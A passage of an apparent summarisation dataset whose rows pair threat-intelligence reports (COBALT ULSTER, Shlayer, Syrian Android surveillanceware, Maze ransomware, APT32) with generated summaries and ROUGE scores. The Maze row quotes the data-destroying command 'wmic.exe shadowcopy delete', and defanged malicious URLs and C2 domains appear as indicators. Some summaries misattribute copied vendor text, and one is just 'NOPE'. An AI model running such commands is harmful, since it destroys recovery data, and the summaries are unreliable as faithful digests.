VBScript and PowerShell (e.g., the jjcpquui file shown in Figure 2) downloads a secondstage obfuscated PowerShell downloader (see Figure 3). This code downloads additional payloads from an IP address hardcoded in the script (see Figure 4). CTU researchers have observed four different IP addresses. Although many threat groups use multiple layers of obfuscation and multiple stages of activity to deploy payloads, these practices are common in COBALT ULSTER operations. The second infection chain analyzed by CTU researchers also used a spearphishing email to deliver a ZIP archive containing a malicious Excel file. In this case, the Excel file uses an obfuscated macro to drop and execute a previously unobserved remote access trojan (RAT) that CTU researchers refer to as ForeLord. The malicious document uses cmd.exe to execute a batch script (tt.bat) that adds a key to the registry for persistence when the system restarts. In parallel, a PowerShell script uses rundll32.exe to execute the ForeLord malware (Exchange.dll) (see Figure 5). The DNSbased command and control (C2) protocol uses DNS_TYPE_TEXT records to transfer data. The ForeLord name reflects one of the DNS responses that the malware looks for as part of the C2 protocol: ""lord The ForeLord malware uses DNS request formats that correspond to one of the patterns shown in Figure 6. Figure 6. Format of ForeLord DNS requests. (Source: Secureworks)The use of DNS tunneling means the requests are initially directed to legitimate DNS servers, which relay the requests to malicious nameservers controlled by the threat actors. Pivoting on elements of the C2 protocol, CTU researchers identified 14 additional domains possibly registered by COBALT ULSTER. Figure 7. Overview of the interplay of the two infection chains observed in January 2020 campaigns. (Source: Secureworks)After gaining initial access to a host, the threat actors dropped several tools to collect credentials, test those credentials on the network, and create a reverse SSL tunnel to provide an additional access channel to the network. These tools included PASS32.dll, PASS64.dll (see Figure 8), PasswordDumper.exe, and a Mimikatz variant named Caller.dll. The Caller.dll command line included Base64encoded arguments, potentially as an evasion technique to hide the nature of this tool. Figure 8. Example command line used to run PASS64.dll. (Source: Secureworks)CredNinja.ps1 (see Figure 9) is an opensource tool that allows penetration testers to quickly test collected credentials or hashes to determine which will work on a targeted Windows domain. The threat actors used a list of valid user accounts from the target domain in conjunction with a weak password list to determine potentially accessible accounts. The password list could be augmented to test credentials captured from credentialdumping tools. Figure 9. CredNinja ASCII splash screen showing available options. (Source: GitHub)The opensource CTU researchers advise organizations not to conflate ongoing espionage operations with a retaliatory response. However, continually leveraging threat intelligence to assess and improve controls will help network defenders secure their environments against malicious activity regardless of intent.";en;{'r': 0.5499316005471956, 'p': 0.9663461538461539, 'f': 0.7009590189167755};{'r': 0.48712288447387786, 'p': 0.9457142857142857, 'f': 0.6430305928895541};{'r': 0.5499316005471956, 'p': 0.9663461538461539, 'f': 0.7009590189167755}
https://securelist.com/shlayer-for-macos/95724/;Shlayer Trojan attacks one in ten macOS users;"For close to two years now, the Shlayer Trojan has been the most common threat on the macOS platform: in 2019, one in ten of our Mac security solutions encountered this malware at least once, and it accounts for almost 30% of all detections for this OS. The first specimens of this family fell into our hands back in February 2018, and we have since collected almost 32,000 different malicious samples of the Trojan and identified 143 C&C server domains.The operation algorithm has changed little since Shlayer was first discovered, nor has its activity decreased much: the number of detections remains at the same level as in the first months after the malware was uncovered.Technical detailsDespite its prevalence, from a technical viewpoint Shlayer is a rather ordinary piece of malware. Of all its modifications, only the recent Trojan-Downloader.OSX.Shlayer.e stands apart. Unlike its Bash-based cousins, this variant of the malware is written in Python, and its operation algorithm is also somewhat different. Let's demonstrate this using a DMG file with MD5 4d86ae25913374cfcb80a8d798b9016e.First stage of infectionAfter mounting this DMG image, the user is prompted to run an ""installation"" file. However, the seemingly standard installer turns out to be a Python script, which is already atypical of macOS installation software.The directory with executable files inside the application package contains two Python scripts: gjpWvvuUD847DzQPyBI (main) and goQWAJdbnuv6 (auxiliary). The latter implements data encryption functions by means of a byte shift on the key key:The encryptText / decryptText pair of functions encrypt and decrypt strings,/ pair of functions encrypt and decrypt strings, encryptList encrypts the contents of the list passed in the arguments, decryptList performs the inverse operation,encrypts the contents of the list passed in the arguments, performs the inverse operation, The getKey() function generates an encryption key based on the time in the operating system.Next, the main script generates a unique user and system ID, and also collects information about the version of macOS in use. Based on this data, the GET query parameters are generated to download the ZIP file:The ZIP archive downloaded to the /tmp/%(sessionID) directory is unpacked to the /tmp/tmp directory using the unzip function:The ZIP archive was found to contain an application package with the executable file 84cd5bba3870:After unpacking the archive, the main python script uses the chmod tool to assign the file 84cd5bba3870 permission to run in the system:For added effect, the sample copies the icon of the original mounted DMG image to the directory with the newly downloaded application package using the moveIcon and findVolumePath functions:After that, the Trojan runs the downloaded and unpacked application package using the built-in open tool, and deletes the downloaded archive and its unpacked contents:Second stage of infectionShlayer itself performs only the initial stage of the attack -- it penetrates the system, loads the main payload, and runs it. The negative consequences for the user can be seen by investigating the AdWare.OSX.Cimpli family, which was being actively downloaded by the Trojan at the time of writing.At first glance, the Cimpli installer looks harmless enough, simply offering to install a partner application (for example, Any Search):But in actual fact, Cimpli performs several actions unseen by the user. First, it installs a malicious extension in Safari, hiding the OS security notification behind a malware fake window. By clicking on the buttons in the notification, the user in effect agrees to install the extension.One of these extensions is called ManagementMark, which we detect as not-a-virus:HEUR:AdWare.Script.SearchExt.gen. It monitors user searches and redirects them to the address hxxp://lkysearchex41343-a.akamaihd[.]net/as?q=c by injecting the script script.js in the browser pages:The sample also loads the mitmdump tool, which is packed using PyInstaller. To allow mitmdump to view HTTPS traffic, a special trusted certificate is added to the system. This is likewise done by superimposing a fake window over the installation confirmation box. After that, all user traffic is redirected to the SOCKS5 proxy launched using mitmdump.From the screenshot, it can be seen that all traffic passing through mitmdump (SearchSkilledData) is processed by the script SearchSkilledData.py (-s option):This script redirects all user search queries to hxxp://lkysearchds3822-a.akamaihd[.]net. Kaspersky solutions detect this script as not-a-virus:AdWare.Python.CimpliAds.a.Cimpli adware thus becomes firmly anchored in the system, in the event that traffic does not pass through the proxy server, the JS code of the extension injected in the page handles the redirection of queries. The attacker gains access to the user's search queries and can modify the search engine results to display advertising. As a result, the user is inundated with unsolicited ads.Note that Cimpli is not the only family of adware apps that Shlayer can download. The list also includes AdWare.OSX.Bnodlero, AdWare.OSX.Geonei, and AdWare.OSX.Pirrit, which made up almost all the remaining positions in the Top 10 threats for macOS in 2019.Family tiesThe behavioral similarities between the Python version of Shlayer and earlier modifications of the family written in Bash are not hard to spot: harvesting IDs and system versions, downloading an archive to a temporary directory, executing the downloaded file, deleting traces of downloading -- we've seen this course of actions before. Moreover, both modifications use curl with the combination of options -f0L, which is basically the calling card of the entire family:DistributionDistribution is a vital part of any malware's life cycle, and the creators of Shlayer have taken this issue to heart. Looking for the latest episode of your favorite TV show? Want to watch a live broadcast of a soccer match? Then take extra care, since the chances of a run-in with Shlayer are high.We noticed at once several file partner programs in which Shlayer was offered as a monetization tool. Having analyzed various offers, we identified a general trend: Shlayer stands out from the field for the relatively high installation fee (though only installations performed by U.S.-based users count). The prospect of a juicy profit likely contributed to the popularity of the offer (we counted more than 1000 partner sites distributing Shlayer).In most cases, it was advertising landing pages that brought users to the next stage of the distribution chain -- nicely crafted fake pages prompting to install the malware under the veil of a Flash Player update. This is primarily how the Trojan-Downloader.OSX.Shlayer.a modification was distributed.The version of Trojan-Downloader.OSX.Shlayer.e discussed above was propagated in a slightly different way. Similar to the previous scheme, users ended up on a page seemingly offering an Adobe Flash update. But they were redirected there from large online services boasting a multimillion-dollar audience. Time and again, we have uncovered links pointing to malware downloads in the descriptions of YouTube videos:Another example is links to Shlayer distribution pages contained in the footnotes to Wikipedia articles:These links were not added by the cybercriminals themselves: we found that all those malicious domains had recently expired, and, judging by the WHOIS data, they now belong to a single individual. On the websites, the newly minted owner posted a malicious script that redirects users to Shlayer download landing pages. There are already over 700 such domains in total.Our statistics show that the majority of Shlayer attacks are against users in the U.S. (31%), followed by Germany (14%), France (10%), and the UK (10%). This is wholly consistent with the terms and conditions of partner programs that deliver the malware, and with the fact that almost all sites with fake Flash Player download pages had English-language content.ConclusionHaving studied the Shlayer family, we can conclude that the macOS platform is a good source of revenue for cybercriminals. The Trojan links even reside on legitimate resources -- attackers are adept in the art of social engineering, and it is hard to predict how sophisticated the next deception technique will be.Kaspersky solutions detect Shlayer and its artifacts and download pages with the following verdicts:HEUR:Trojan-Downloader.OSX.Shlayer.*not-a-virus:HEUR:AdWare.OSX.Cimpli.*not-a-virus:AdWare.Script.SearchExt.*not-a-virus:AdWare.Python.CimpliAds.*not-a-virus:HEUR:AdWare.Script.MacGenerator.genIOCS:4d86ae25913374cfcb80a8d798b9016efa124ed3905a9075517f497531779f92594aa050742406db04a8e07b5d247cddMalicious links:hxxp://80.82.77.84/.dmghxxp://sci-hub[.]tvhxxp://kodak-world[.]comC&C Urls:";"The ITSecurity report states that the Shlayer Trojan has been the most common threat on the macOS platform for close to two years now. In 2019, one in ten of our Mac security solutions encountered this malware at least once, and it accounts for almost 30% of all detections for this OS. The first specimens of this family fell into our hands back in February 2018, and we have since collected almost 32,000 different malicious samples of the Trojan and identified 143 C&C server domains. The operation algorithm has changed little since Shlayer was first discovered, nor has its activity decreased much. Despite its prevalence, from a technical viewpoint Shlayer is a rather ordinary piece of malware. Of all its modifications, only the recent TrojanDownloader.OSX.Shlayer.e stands apart. Unlike its Bashbased cousins, this variant of the malware is written in Python, and its operation algorithm is also somewhat different. Let's demonstrate this using a DMG file with MD5 4d86ae25913374cfcb80a8d798b9016e. First stage of infection After mounting this DMG image, the user is prompted to run an ""installation"" file. However, the seemingly standard installer turns out to be a Python script, which is already atypical of macOS installation software. The directory with executable files inside the application package contains two Python scripts: gjpWvvuUD847DzQPyBI (main) and goQWAJdbnuv6 (auxiliary). The latter implements data encryption functions by means of a byte shift on the key key: The encryptText / decryptText pair of functions encrypts and decrypts strings;";en;{'r': 0.24345146379044685, 'p': 0.9349112426035503, 'f': 0.3863080651813117};{'r': 0.17983193277310924, 'p': 0.8916666666666667, 'f': 0.29930069650740876};{'r': 0.23882896764252695, 'p': 0.9171597633136095, 'f': 0.3789731018561283}
https://www.lookout.com/blog/nation-state-mobile-malware-targets-syrians-with-covid-19-lures;Nation-state Mobile Malware Targets Syrians with COVID-19 Lures;"Lookout researchers have uncovered a long-running surveillance campaign tied to Syrian nation-state actors, which recently started using the novel coronavirus as its newest lure to entice its targets to download malware.This campaign appears to have been active since the start of January 2018, and targets Arabic-speaking users, likely in Syria and the surrounding region. None of these apps were available on the official Google Play Store, suggesting they were likely distributed through actor-operated watering holes or third-party app stores. Lookout previously reported on another surveillanceware campaign using COVID-19 related lures targeting Libya.?Applications from this surveillance campaign impersonate a variety of applications, with titles such as ""Covid19"", ""Telegram Covid_19"", ""Android Telegram"", and ""Threema Arabic"" (an end-to-end encrypted messaging application), as well as a phone signal booster and OfficeSuite application. Package names also allude to Syrian targeting, with names such as ""com.syria.tel"", ""syria.tel.ctu"", and ""com.syriatel.ctu"".?Syrian connectionsLookout researchers found 71 malicious Android applications connected to the same command-and-control (C2) server. The IP address of the C2 server is located in a block of addresses held by Tarassul Internet Service Provider, an ISP owned by - and sharing network infrastructure with - the Syrian Telecommunications Establishment (STE) (Freedom House, 2018). STE has a history of hosting infrastructure for the Syrian Electronic Army (SEA), a Syrian state-sponsored hacking group. Notably, the C2 servers of SilverHawk, an Android malware family previously reported on by Lookout researchers, were located on IP addresses belonging to STE.Not all applications in this campaign were completely scrubbed of sensitive information when they were created. A large portion of the malicious applications are SpyNote samples, which store C2 information, along with user inputted names, version numbers, and other information, in res/values/strings.xml. In the strings.xml files of these applications, 22 APKs reference ""Allosh"", a name previously used in connection with a known Syrian Electronic Army persona.Previous strings appearing in other malware associated with the Syrian Electronic Army contain this name, such as ""c:\users\allosh hacker\documents\visual studio 2012\Projects\allosh\allosh\obj\Debug\Windows.pdb"" mentioned in reporting by Citizen Lab on the SEA malicious repackaging of the Psiphon 3 circumvention tool, and ""c:\Users\Allosh Hacker\Desktop\Application\obj\Debug\Clean Application.pdb"" from pdb paths discovered in binaries associated with SilverHawk infrastructure.Screenshot of a strings.xml file, and all unique personas discovered in this campaign.?The Syrian Electronic Army has been active recently, with one of their Twitter accounts claiming responsibility this month for DDoS attacks against Belgian media, as well as defacing PayPal and eBay websites as recently as April 7, 2020.?Two of the most recent claims by @Official_SEA7, one of the Syrian Electronic Army's multiple Twitter accounts which has been active since 2013.?Syrian authorities are known to heavily censor their country's internet, with Syria ranking 174th on Reporters Without Borders 2019 World Press Freedom Index. In addition, according to the 2018 Freedom of the Net Report published by Freedom House, an NGO which conducts research and advocacy on democracy, political freedom, and human rights, ""In areas controlled by the government, the Syrian Telecommunications Establishment (STE) serves as both an ISP and the telecommunications regulator, providing the government with tight control over the internet Infrastructure. Furthermore, private fixed-line and mobile ISPs are required to sign a memorandum of understanding to connect to the international internet via gateways controlled by the Syrian Information Organization (SIO)"" (Freedom on the Net 2018).?After installation, the original Covid19 application hides its icon and only displays the newly installed Degree Measure application.?The newly installed application (com.finger.body.temperature.ap) is a benign prank - a fake digital thermometer that serves as a decoy. Meanwhile the malware continues to operate in the background.?The user holds down on the screen on the fingerprint and is informed that their body temperature is 35degC.?Some AndoServer samples are purely surveillanceware that do not even pretend to be anything else, while others, like this sample here, contain legitimate applications inside the malware, with the benign APK hidden in the res/raw folder.AndoServer samples receive commands, and are capable of:Taking a screenshotGetting battery levels and if the device is plugged inReporting location (latitude and longitude)Getting a list of installed applicationsLaunching an application specified by the malicious actorChecking the number of cameras on a deviceChoosing a specific camera to accessCreating a specific pop-up message (toast)Recording audioCreating a file on external storageExfiltrating call logsListing files contained in a specified directoryCalling a phone numberExfiltrating SMS messagesSending SMS to a phone numberExfiltrating the contact listPlaying a ringtone and then sleepingAndoServer malware has its C2 domain or IP address hard coded into the source code. Each sample also has its own unique identifier string at the start of its communication with C2 servers, that appears to be for the actor to monitor which application in their arsenal is responsible for the compromise, as they can see the unique application installed by the specific victim. While not always the case, some unique identifiers are similar to the name of the C2 domain, while other times they refer to the title of the application, highlighting another level of customization of this malware.?Prevalence of commercial surveillancewareOf the malicious applications in this campaign, 64 of 71 are SpyNote samples, a well known commercial surveillanceware family. The remainder belong to the SandroRat, AndoServer, and SLRat families, of which the latter two have not yet been publicly reported on.SLRat appears to have gained popularity since its developer first publicized it in May 2016, advertising it as ""the Best and Free android remote admin tool"", while AndoServer has not yet been seen for sale or mentioned on public forums. Based on samples ingested to date however, Lookout researchers believe it is also a customizable Android malware that may be for sale, or only known about and used by a smaller group of operators.Given Syria's history of censorship and past mobile and desktop surveillance campaigns, it should come as no surprise that another campaign is active. SilverHawk actors initially entered the mobile malware space using the commercial Android surveillanceware AndroRat, before customizing it and then developing their own mobile tooling. It is in line with known TTPs that a new commercial or public spy tool might have been adopted and used by this actor as part of new surveillance efforts, and there are likely more to be discovered.Lookout has been ingesting samples from the AndoServer and SJRat families since 2016, and has seen a spike in activity towards the end of 2019.?IOCs (SHA1 hashes of the malicious apps):1aefc2ebaf1a78f23473ce6275b0b514bbcdfb08213b7f8c3f26a87b116927143289886742b979a1321682c8395216b6f71ac1f4a1188040bbddfeb48cae26c899440f890a8faca2e63ba42c0195cd3bccb143b25cedf043a8be46a1f3c3f8a0a3e4c2b261ecf4d82246a22dc2d390eca1e20abd6b9610831e30cc843a32db0296502795781f8064adbceee6a07370617fa695b047359ac345375d05a7135da0915e3470e5ab85cb1fe565484b15004a19e88da63bfa1b4d98c02c43e7b3af9e536dbcd79e0b9197d14bb8de94e6f6a733b0962c6d0847376286874f3c5fd8b163b32cde47dd50c4b61ab087c0cad8d44dcc2d9ef4921b3eb4e4dc72dd3716520d55810207c1edf35c60ea6f2ff02df6e0bfa24abb3029c150c607a138e33c8cbdcf2f617f61095b7efa06dab1a9bc32ece469d7e2d43e894e68cb3bec17ac8234cb80d4e5d19fcaf724b73aacfebbb19c79337ec21919c6064c739533878da39d0feaf83e99f586a62250430da13436b80a62f6a1fee67ed0050e37246a17230dbe8a5c533231fa1da80d977985b111358653280acdfd84b6ca326c9b06d12878af69c84ec39acfc6f3f9715d0d0e2b0a2f7121d617b6059f09a4868f61d174ad075e5acaa8d849294dbf698952bdf2e3d777d01011e6f8619fca8835e8c434b9dffff37efbfb8e577ee242c8807db967704a0d5f6019eae4a16abd11d981b2da5d4ef05115a5c40b7cf990bb0dc62dd44d9fa6410ca591dfe47a5d08162ad39a6237e4eebacf764a5ca6158816a86ef2fb9826da43f92ff69686f999f205502a33342cc2e5287433a0e3c7d059494e65b87c3c36f74a47c7405d85a78a62003494f398084cff8f1794e2ab16c9ef6ed5af0855a3e6b963ff9c2d65d70de11ebae5c56d3cd888ec19c42bf5d782de327d012a3734cc91ad64f52420b6e1531c097ac1602af1f08900455a4652faf751753b5ebfbb0656bee530f4efb263eec151b11d0a6ebcfcf37b3b98458d2d530c18cc448d71437e7a72558f6680ff10fb234fc64f6a68f8d962adae7d767b6dfeb2d5b90be412b1f10fdc50226a7eb9aee6e6422907425d4531290374aa43f78a2667909546c3cd993a2940b0766343795b2e709dfc95e9fc4e4343b92c76cc2193acd49ae6962b122e14e59c7c88a25d405d6c653b31590e9c83fdecc8429bc278d03116ca9e2cff5013987e53653984310845988103051e7acf4ed336150b9918451fc0e8fbe878f242e7ee1834091c455f8fc10f7bf07352b4d1852f651dda350fd446b3477740615863ce030f3de3e377352637d6ecc55dfd185ab46b241620a4d5682e9083ce726827fdbf4a96e5ab259f11163ea51767a6b17855bc0e79a8ae96e4447165f88f951f8d26bc721f3047533a54f59ce029e04da270da0a6bedfcaee3f6fe8251d6cdef316cebf3c27fb348272b72041451b232f78190f83de99ebc998ab63026b9b40fff55037c1b69a80369ddf2b474a0ed1b47278d00872a84d2a2405cc33c01963c9c70102961cb8b424f623e9be32d7b255b8d664c9753f7bf65a8cce69dca5486971d1f06ca2d01b7691ce5647e60c566eda33166bf2e9bcc5344d8bc4406227aeec9711b74f771c05ddfd3d1730c04da70ba0771734f99eba05a5676713675d0e837e11e1a45f166b16170e8d649c3b75ee93e90a8dbfbfe43f04c58bcf5daa71df61dcc354bbf2d27dc3778ffb7399e009a287983f0113e15fd8b227e1a0a65e6b4a2c42e5dc3d7db2179c04952a0394869f475024e006b51f7ec6a1990bad460fe9805f0a32900a79d459da90e49ee8acf23dcfd03bfcb4b5c8bf130f8e5c7756674a6d376dd7f25fbded4e4";"The ITSecurity report states that a surveillance campaign tied to Syrian nationstate actors recently started using the novel coronavirus as its newest lure to entice its targets to download malware. This campaign appears to have been active since the start of January 2018, and targets Arabicspeaking users, likely in Syria and the surrounding region. None of these apps were available on the official Google Play Store, suggesting they were likely distributed through actoroperated watering holes or thirdparty app stores. Applications from this surveillance campaign impersonate a variety of applications, with titles such as ""Covid19"", ""Telegram Covid_19"", ""Android Telegram"", and ""Threema Arabic"" (an endtoend encrypted messaging application), as well as a phone signal booster and OfficeSuite application. Package names also allude to Syrian targeting, with names such as ""com.syria.tel"", ""syria.tel.ctu"", and ""com.syriatel.ctu"". Syrian connections Lookout researchers found 71 malicious Android applications connected to the same commandandcontrol (C2) server. The IP address of the C2 server is located in a block of addresses held by Tarassul Internet Service Provider, an ISP owned by and sharing network infrastructure with the Syrian Telecommunications Establishment (STE) (Freedom House, 2018). STE has a history of hosting infrastructure for the Syrian Electronic Army (SEA), a Syrian statesponsored hacking group. Notably, the C2 servers of SilverHawk, an Android malware family previously reported on by Lookout researchers, were located on IP addresses belonging to STE"" (Freedom on the Net";en;{'r': 0.27486437613019893, 'p': 0.9212121212121213, 'f': 0.4233983251509145};{'r': 0.20594262295081966, 'p': 0.8777292576419214, 'f': 0.3336099554277096};{'r': 0.27486437613019893, 'p': 0.9212121212121213, 'f': 0.4233983251509145}
https://www.sentinelone.com/labs/maze-ransomware-update-extorting-and-exposing-victims/;Maze Ransomware Update: Extorting and Exposing Victims;"[Updated April 20, 2020]On April 17th, it was reported that a large enterprise-class, managed service provider (Cognizant) fell victim to a Maze ransomware attack. This particular campaign includes a signed DLL payload (kepstl32.dll). Upon infection, the trojan will drop a customized desktop image into %temp%, and then traverse the disk, encrypting supported file-types. A copy of the ransom instructions ""DECRYPT-FILES.txt"" is dropped into each folder containing encrypted files. As with previous variants of Maze, the trojan will attempt to inhibit recovery by deleting shadow copies via WMIC.exe (wmic.exe shadowcopy delete) Relevant Digital Signature details are as follows:Signer Identity: GO ONLINE D.O.O. (Verified, Cert id: GO ONLINE D.O.O.)Serial Number: 26 91 74 f9 fe 7c 6e d4 e1 d1 9b 26 c3 f5 b3 5fIssuer: CN = Sectigo RSA Code Signing CASubject: CN = GO ONLINE d.o.o.SentinelOne's Endpoint Protection Platform is capable of detecting and preventing malicious artifacts associated with the latest waves of Maze ransomware.[December 19, 2019]The group behind the Maze ransomware campaigns has been keeping quite busy as of late. We have touched on this threat previously. However, given some recent events and revelations, an update is absolutely warranted.Background to Maze RansomwareMaze was initially observed in May of 2019. It was a noted component of steady, yet unremarkable, extortion campaigns. However, in approximately the last two months we have seen a sizable uptick in Maze campaigns, including many notable, high-profile attacks. The actors behind Maze have previously claimed credit for attacks on both Allied Financial as well as the City of Pensacola Florida. More recently, the so-called ""Maze Crew"" has shifted to a more aggressive and public phase of attack. They are now publicly 'outing' targeted companies that chose not to comply with their criminal demands. We will circle back to that point a bit later in this post.Maze Ransomware: Encrypt, Exfiltrate and ExtortThere are a few traits that really set Maze apart from its contemporaries in the malware family universe. Primarily, the goal extends beyond the direct encryption of data local to the targeted environment. While that does occur, there is also functionality to exfiltrate files to remote resources under the attacker's control.At this point, they can not only demand money to decrypt the data on compromised endpoints but also extort the victim in return for not leaking the exfiltrated data to the public. Many ransomware victims are able to recover encrypted data without having to succumb to the demands of the malware authors. In these campaigns though, that alone may not save them. Preventing the release of sensitive or confidential data brings about a whole new set of problems, and the ability to ""resolve matters quietly"" becomes more of a reach.It should also be noted that Maze is not the only ransomware family that embraces this multi-pronged approach. It was not long ago that we saw the Snatch ransomware gang post a 500+ GB data dump, all looted from their breach of CITYCOMP Service GmbH.We have observed this with other highly-prolific families as well such as REvil (Sodinokibi). In the forum post shown below, we actually see an apparent ""lead"" in the REvil/Sodin group taking credit for the recent attack on CyrusOne and threatening to go forward with an approach similar to that of Maze.Maze and Multi-Stage Malware CampaignsIn addition, the delivery of the Maze ransomware is typically the 2nd or 3rd step in these campaigns. From the onset (mid-2019) to present day, the primary stage 1 delivery vector is phishing and spearphishing emails. Early campaigns were focused on using emails spoofed to appear to be from various Government entities. These include the United States Postal Service, German Federal Ministry of Finance, the Italian Ministry of Taxation, 1 & 1 Internet AG, and similar. These emails include a maliciously crafted document that has been weaponized to deliver a Cobalt Strike (Beacon) payload. With the Cobalt Strike payloads injected, the cybercriminals can then further traverse the target environment (move laterally) or pull-down additional tools and malware. In this case, the 2nd or 3rd stage malware is the Maze Ransomware. The ransomware versions contain whitelisted directories, boot and user files exclusions and anti-virus product grabber.Starting with Cobalt Strike ensures enough persistence for the attacker to exfiltrate what they need, while maintaining a very low footprint on infected hosts. Cobalt Strike can also be used to directly handle the exfiltration tasks as well, although that is not always the case. If LOTL (Live off the Land) tactics can be employed, they will be.Maze Goes Public With Victims' DetailsMoving to present day (mid-December 2019), the ""Maze Crew"" has gone fully public with a list of ""non-compliant"" victims. Currently, 11 companies are listed, along with various amounts of supporting data and ""proof"" of compromise. Typically, this is in the form of documents or raw databases specific to each environment. For each listed company, the amount of exfiltrated data is detailed, along with a table of specific hosts that the attackers not only encrypted but also extracted data from. Internal IP addresses, hostnames, and country/geo data are included as well.Not all data is provided for all victims, but from what is available we can see, at the very least, that several hundred GB of data could be released when time runs out for each of these companies. The victims come from a wide variety of industries including Distribution/Logistics, Food and Agriculture, Commercial Services & Products, Manufacturing, Insurance Services as well as Government entities.ConclusionMaze ransomware doesn't just demand payment for a decryptor but exfiltrates victim data and threatens to leak it publicly if the target doesn't pay up. This ""double whammy"" piles on yet more pressure to convince the victim to cave into the cybercriminals' demand. As we've seen time and again, threat actors will use any and every trick they can to ensure a payday. The onus now is on businesses to make sure they have a trusted security solution proven to prevent ransomware from executing in the first place, as even the ability to restore data from a backup won't save the day against this latest tactic in the criminals' playbook.Indicators of Compromise (IOCs):SHA-256: 9d86beb9d4b07dec9db6a692362ac3fce2275065194a3bda739fe1d1f4d9afc7SHA-256: 5c9b7224ffd2029b6ce7b82ea40d63b9d4e4f502169bc91de88b4ea577f52353SHA-256: 4218214f32f946a02b7a7bebe3059af3dd87bcd130c0469aeb21b58299e2ef9aSHA-256: fb5de69b222d81fea2f4b08fd5af612faf24b9e75698ac331af066fbc360a30a";"The ITSecurity report summarizes the latest Maze ransomware campaigns, which include a signed DLL payload (kepstl32.dll). Upon infection, the trojan will drop a customized desktop image into %temp%, and then traverse the disk, encrypting supported filetypes. A copy of the ransom instructions ""DECRYPTFILES.txt"" is dropped into each folder containing encrypted files. As with previous variants of Maze, the trojan will attempt to inhibit recovery by deleting shadow copies via WMIC.exe (wmic.exe shadowcopy delete) Relevant Digital Signature details are as follows: Signer Identity: GO ONLINE D.O.O. (Verified, Cert id: GO ONLINE D.O.O. ) Serial Number: 26 91 74 f9 fe 7c 6e d4 e1 d1 9b 26 c3 f5 b3 5f Issuer: CN = Sectigo RSA Code Signing CASubject: CN = GO ONLINE d.o.o. SHA256: 9d86beb9d4b07dec9db6a692362ac3fce2275065194a3bda739fe1d1f4d9afc7 SHA256: 5c9b7224ffd2029b6ce7b82ea40d63b9d4e4f502169bc91de88b4ea577f52353 SHA256: 4218214f32f946a02";en;{'r': 0.17157712305025996, 'p': 0.8608695652173913, 'f': 0.2861271648587073};{'r': 0.10585817060637205, 'p': 0.7923076923076923, 'f': 0.18676337054074071};{'r': 0.17157712305025996, 'p': 0.8608695652173913, 'f': 0.2861271648587073}
https://www.mandiant.com/resources/blog/apt32-targeting-chinese-government-in-covid-19-related-espionage;Vietnamese Threat Actors APT32 Targeting Wuhan Government and Chinese Ministry of Emergency Management in Latest Example of COVID-19 Related Espionage;"From at least January to April 2020, suspected Vietnamese actors APT32 carried out intrusion campaigns against Chinese targets that Mandiant Threat Intelligence believes was designed to collect intelligence on the COVID-19 crisis. Spear phishing messages were sent by the actor to China's Ministry of Emergency Management as well as the government of Wuhan province, where COVID-19 was first identified. While targeting of East Asia is consistent with the activity we've previously reported on APT32, this incident, and other publicly reported intrusions, are part of a global increase in cyber espionage related to the crisis, carried out by states desperately seeking solutions and nonpublic information.Phishing Emails with Tracking Links Target Chinese GovernmentThe first known instance of this campaign was on Jan. 6, 2020, when APT32 sent an email with an embedded tracking link (Figure 1) to China's Ministry of Emergency Management using the sender address lijianxiang1870@163[.]com and the subject ????????????? (translation: Report on the first quarter results of office equipment bids). The embedded link contained the victim's email address and code to report back to the actors if the email was opened.Figure 1: Phishing email to China's Ministry of Emergency ManagementMandiant Threat Intelligence uncovered additional tracking URLs that revealed targets in China's Wuhan government and an email account also associated with the Ministry of Emergency Management.libjs.inquirerjs[.]com/script/<VICTIM>@wuhan.gov.cn.pnglibjs.inquirerjs[.]com/script/<VICTIM>@chinasafety.gov.cn.pngm.topiccore[.]com/script/<VICTIM>@chinasafety.gov.cn.pngm.topiccore[.]com/script/<VICTIM>@wuhan.gov.cn.pnglibjs.inquirerjs[.]com/script/<VICTIM>@126.com.pngThe libjs.inquirerjs[.]com domain was used in December as a command and control domain for a METALJACK phishing campaign likely targeting Southeast Asian countries.Additional METALJACK Activity Suggests Campaigns Targeting Mandarin Speakers Interested in COVID-19APT32 likely used COVID-19-themed malicious attachments against Chinese speaking targets. While we have not uncovered the full execution chain, we uncovered a METALJACK loader displaying a Chinese-Language titled COVID-19 decoy document while launching its payload.When the METALJACK loader, krpt.dll (MD5: d739f10933c11bd6bd9677f91893986c) is loaded, the export ""_force_link_krpt"" is likely called. The loader executes one of its embedded resources, a COVID-themed RTF file, displaying the content to the victim and saving the document to %TEMP%.The decoy document (Figure 2) titled ???????????????????????, MD5: c5b98b77810c5619d20b71791b820529 (Translation: COVID-19 live updates: China is currently tracking all travelers coming from Hubei Province) displays a copy of a New York Times article to the victim.Figure 2: COVID-themed decoy documentThe malware also loads shellcode in an additional resource, MD5: a4808a329b071a1a37b8d03b1305b0cb, which contains the METALJACK payload. The shellcode performs a system survey to collect the victim's computer name and username and then appends those values to a URL string using libjs.inquirerjs[.]com. It then attempts to call out to the URL. If the callout is successful, the malware loads the METALJACK payload into memory.It then uses vitlescaux[.]com for command and control.OutlookThe COVID-19 crisis poses an intense, existential concern to governments, and the current air of distrust is amplifying uncertainties, encouraging intelligence collection on a scale that rivals armed conflict. National, state or provincial, and local governments, as well as non-government organizations and international organizations, are being targeted, as seen in reports. Medical research has been targeted as well, according to public statements by a Deputy Assistant Director of the FBI. Until this crisis ends, we anticipate related cyber espionage will continue to intensify globally.IndicatorsType Indicators Domains m.topiccore[.]com jcdn.jsoid[.]com libjs.inquirerjs[.]com vitlescaux[.]com Email Address lijianxiang1870@163[.]com Files MD5: d739f10933c11bd6bd9677f91893986c METALJACK loader MD5: a4808a329b071a1a37b8d03b1305b0cb METALJACK Payload MD5: c5b98b77810c5619d20b71791b820529 Decoy Document (Not Malicious)Detecting the TechniquesPlatform Signature Name Endpoint Security Generic.mg.d739f10933c11bd6 Network Security Trojan.Apost.FEC2, Trojan.Apost.FEC3, fe_ml_heuristic Email Security Trojan.Apost.FEC2, Trojan.Apost.FEC3, fe_ml_heuristic HelixMandiant Security Validation ActionsA150-096 - Malicious File Transfer - APT32, METALJACK, DownloadA150-119 - Protected Theater - APT32, METALJACK ExecutionA150-104 - Phishing Email - Malicious Attachment, APT32, Contact Information LureMITRE ATT&CK Technique Mapping";NOPE;en;{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0};{'r': 0.0, 'p': 0.0, 'f': 0.0}
